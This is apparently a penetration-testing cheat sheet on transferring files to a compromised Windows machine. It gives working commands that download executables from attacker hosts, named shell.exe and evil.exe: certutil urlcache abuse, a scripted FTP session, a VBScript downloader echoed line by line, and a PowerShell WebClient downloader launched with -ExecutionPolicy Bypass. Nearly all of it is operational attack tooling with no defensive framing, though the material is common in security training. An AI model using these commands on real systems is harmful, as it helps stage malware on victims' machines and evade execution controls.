# Windows File Transfer

Certutil
- certutil.exe -urlcache -split -f "http://10.10.10.10/shell.exe" C:/Users/user/shell.exe

FTP
- echo open 192.168.1.101 21> ftp.txt
- echo USER asshat>> ftp.txt
- echo mysecretpassword>> ftp.txt
- echo bin>> ftp.txt
- echo GET wget.exe>> ftp.txt
- echo bye>> ftp.txt
Then run this command to connect to the ftp:
- ftp -v -n -s:ftp.txt

Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.

VBScript
Here is a good script to make a wget-clone in VB.
If it doesn't work try piping it through unix2dos before copying it.

- echo strUrl = WScript.Arguments.Item(0) > wget.vbs
- echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
- echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
- echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
- echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
- echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
- echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
- echo Err.Clear >> wget.vbs
- echo Set http = Nothing >> wget.vbs
- echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
- echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
- echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
- echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
- echo http.Open "GET",strURL,False >> wget.vbs
- echo http.Send >> wget.vbs
- echo varByteArray = http.ResponseBody >> wget.vbs
- echo Set http = Nothing >> wget.vbs
- echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
- echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
- echo strData = "" >> wget.vbs
- echo strBuffer = "" >> wget.vbs
- echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
- echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
- echo Next >> wget.vbs
- echo ts.Close >> wget.vbs

You then execute the script like this:
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe

PowerShell
- echo $storageDir = $pwd > wget.ps1
- echo $webclient = New-Object System.Net.WebClient >>wget.ps1
- echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
- echo $file = "output-file.exe" >>wget.ps1
- echo $webclient.DownloadFile($url,$file) >>wget.ps1
Now we invoke it with this crazy syntax:
- powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
